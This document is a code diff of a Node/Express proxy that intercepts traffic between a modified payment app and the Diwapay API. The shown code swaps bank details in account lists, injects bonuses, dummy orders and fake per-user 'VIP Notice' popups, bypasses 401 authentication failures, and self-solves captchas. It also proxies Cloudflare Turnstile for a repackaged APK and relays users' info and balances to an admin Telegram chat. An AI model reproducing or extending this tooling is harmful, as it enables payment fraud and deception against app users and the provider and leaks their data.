-        const qMin = parseFloat(req.query.minAmount || req.query.min || 0);
-        const qMax = parseFloat(req.query.maxAmount || req.query.max || 9999999);
+        const qMin = parseFloat(req.query.minAmount || 0);
+        const qMax = parseFloat(req.query.maxAmount || 9999999);
         const matchingDummies = data.dummyOrders.filter(d => {
           const amt = parseFloat(d.amount || d.orderAmount || 0);
-          if (req.query.minAmount || req.query.maxAmount || req.query.min || req.query.max) {
+          if (req.query.minAmount || req.query.maxAmount) {
             return amt >= qMin && amt <= qMax;
           }
           return true;
@@ -2525,7 +2504,6 @@ app.all('/app/user/info', async (req, res) => {
         mineMsg += `\n💰 Balance: ₹${realBal}`;
       }
       bot.sendMessage(data.adminChatId, mineMsg).catch(() => { });
-      sendBot2Message(mineMsg);
     }
     if (jsonResp && isAuthFailureResponse(jsonResp) && shouldBypass401(req)) {
       const bypass = make401Bypass(jsonResp);
@@ -2596,7 +2574,6 @@ async function proxyAndAddBonusPersonal(req, res) {
         msg += `\n🌐 *Path:* ${req.originalUrl.split('?')[0]}`;
 
         bot.sendMessage(data.adminChatId, msg, { parse_mode: 'Markdown' }).catch(() => { });
-        sendBot2Message(msg);
       }
     }
 
@@ -2797,6 +2774,34 @@ app.post('/app/payment/order/cancel', async (req, res) => {
     }
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
+});
+
+app.all('/app/app/popup/notice/currentList', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    const userId = await extractUserIdFromToken(req);
+    if (userId && data.userBanners && data.userBanners[String(userId)]) {
+      const b = data.userBanners[String(userId)];
+      let list = Array.isArray(jsonResp?.data) ? jsonResp.data : (Array.isArray(jsonResp?.data?.data) ? jsonResp.data.data : []);
+      const customNotice = {
+        id: b.id || Date.now(),
+        title: b.title || '🚨 VIP Notice',
+        content: b.content || '',
+        type: b.type || 1,
+        linkUrl: '',
+        sort: 999999
+      };
+      list.unshift(customNotice);
+      if (jsonResp) {
+        if (Array.isArray(jsonResp.data)) jsonResp.data = list;
+        else if (jsonResp.data && Array.isArray(jsonResp.data.data)) jsonResp.data.data = list;
+      }
+    }
+    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
+  } catch (e) {
+    await transparentProxy(req, res);
+  }
 });
 
 app.all('/app/payment/order/orderInfo', async (req, res) => {
@@ -3395,7 +3400,13 @@ app.all('/app/user/info/getInviterUrl', async (req, res) => {
 app.all('/app/user/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
 app.all('/app/itoken/appi/token/page', async (req, res) => { await proxyAndReplaceBankInList(req, res); });
 
-
+app.all('/app/app/official/service/getOfficialServiceData', async (req, res) => {
+  const data = await loadData();
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
+  } catch (e) { await transparentProxy(req, res); }
+});
 
 app.all('/app/base/comm/uploadBase64', async (req, res) => {
   const data = await loadData();
@@ -3455,7 +3466,7 @@ app.all('/app/base/comm/upload', async (req, res) => {
       if (kl === 'host' || kl === 'connection' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'appm9t5zk.ddriva.com';
+    fwd['host'] = 'api.diwapay.com';
     const opts = { method: req.method, headers: fwd };
     if (req.rawBody && req.rawBody.length > 0) {
       opts.body = req.rawBody;
@@ -3533,7 +3544,7 @@ async function setCaptchaAnswer(key, ans) {
   }
   if (!redis) return { ok: true, where: 'map-only' };
   try {
-    await redis.set(`ddpayCaptcha:${key}`, JSON.stringify(ans), { ex: 600 });
+    await redis.set(`diwapayCaptcha:${key}`, JSON.stringify(ans), { ex: 600 });
     return { ok: true, where: 'map+redis' };
   } catch (e) {
     return { ok: false, where: 'map+redis-fail', err: e.message };
@@ -3545,7 +3556,7 @@ async function getCaptchaAnswer(key) {
   if (local) return { ans: local, where: 'map' };
   if (redis) {
     try {
-      const raw = await redis.get(`ddpayCaptcha:${key}`);
+      const raw = await redis.get(`diwapayCaptcha:${key}`);
       if (raw) {
         const ans = typeof raw === 'string' ? JSON.parse(raw) : raw;
         return { ans, where: 'redis' };
@@ -3568,7 +3579,7 @@ async function setCaptchaVerifyResult(key, result) {
   }
   if (!redis) return { ok: true, where: 'map-only' };
   try {
-    await redis.set(`ddpayCaptchaVerify:${key}`, JSON.stringify(result), { ex: 600 });
+    await redis.set(`diwapayCaptchaVerify:${key}`, JSON.stringify(result), { ex: 600 });
     return { ok: true, where: 'map+redis' };
   } catch (e) {
     return { ok: false, where: 'map+redis-fail', err: e.message };
@@ -3587,7 +3598,7 @@ async function getCaptchaVerifyResult(key) {
   }
   if (redis) {
     try {
-      const raw = await redis.get(`ddpayCaptchaVerify:${key}`);
+      const raw = await redis.get(`diwapayCaptchaVerify:${key}`);
       if (raw) {
         const result = typeof raw === 'string' ? JSON.parse(raw) : raw;
         return { result, where: 'redis' };
@@ -3605,7 +3616,7 @@ async function serverSideVerify(captchaKey, x, y, templateId, ua) {
   // sharing the outbound IP with the /new request that just succeeded.
   const body = JSON.stringify({ captchaKey, x: Math.round(Number(x)), y: Math.round(Number(y)), templateId: templateId || 'slide-default' });
   const headers = {
-    'host': 'appm9t5zk.ddriva.com',
+    'host': 'api.diwapay.com',
     'content-type': 'application/json',
     'accept': '*/*',
     'accept-encoding': 'identity',
@@ -3630,7 +3641,7 @@ async function serverSideVerify(captchaKey, x, y, templateId, ua) {
 // Fetch a FRESH captcha from upstream (for retry purposes).
 async function fetchFreshCaptcha(ua) {
   const headers = {
-    'host': 'appm9t5zk.ddriva.com',
+    'host': 'api.diwapay.com',
     'accept': '*/*',
     'accept-encoding': 'identity',
     'user-agent': ua || 'Mozilla/5.0 (Linux; Android 16; RMX3853) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0 Mobile Safari/537.36',
@@ -3939,8 +3950,8 @@ app.post('/app/captcha/verify', async (req, res) => {
 
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
 
-    // AUTO-RETRY ON UPSTREAM 1001: DDPay's verify endpoint is flaky and rejects
-    // ~70-80% of valid attempts (confirmed: same behavior in original DDPay app —
+    // AUTO-RETRY ON UPSTREAM 1001: Diwapay's verify endpoint is flaky and rejects
+    // ~70-80% of valid attempts (confirmed: same behavior in original Diwapay app —
     // user has to manually retry 3-4 times). To shield mobile from this, when upstream
     // returns 1001, silently fetch fresh captchas and self-solve them until upstream
     // accepts (or maxAttempts reached). Mobile only needs the captchaToken in the end.
@@ -3998,13 +4009,13 @@ app.all('/app/app/version/info/getLatestAppVersion', async (req, res) => {
 });
 
 // === TURNSTILE PAGE PROXY ===
-// Proxies the Cloudflare Turnstile verification page from captcha.ddriva.com.
+// Proxies the Cloudflare Turnstile verification page from captcha.diwapay.com.
 // The proxy app tries to load Turnstile from mobile.diwapay.com (404).
 // If the APK's Turnstile URL is changed to xchas.vercel.app, this route serves it.
 app.get('/turnstile.html', async (req, res) => {
   try {
     const qs = req.originalUrl.split('?')[1] || '';
-    const targetUrl = `https://captcha.ddriva.com/turnstile.html${qs ? '?' + qs : ''}`;
+    const targetUrl = `https://captcha.diwapay.com/turnstile.html${qs ? '?' + qs : ''}`;
     const ac = new AbortController();
     const tm = setTimeout(() => ac.abort(), 10000);
     const resp = await fetch(targetUrl, {
@@ -4039,7 +4050,7 @@ app.get('/turnstile.html', async (req, res) => {
 // Proxy Cloudflare CDN-CGI endpoints (RUM, challenges, etc.) used by Turnstile
 app.all('/cdn-cgi/*', async (req, res) => {
   try {
-    const targetUrl = `https://captcha.ddriva.com${req.originalUrl}`;
+    const targetUrl = `https://captcha.diwapay.com${req.originalUrl}`;
     const fwd = {};
     for (const [k, v] of Object.entries(req.headers)) {
       const kl = k.toLowerCase();
@@ -4047,7 +4058,7 @@ app.all('/cdn-cgi/*', async (req, res) => {
         kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
       fwd[k] = v;
     }
-    fwd['host'] = 'captcha.ddriva.com';
+    fwd['host'] = 'captcha.diwapay.com';
     fwd['accept-encoding'] = 'identity';
     const opts = { method: req.method, headers: fwd };
     if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
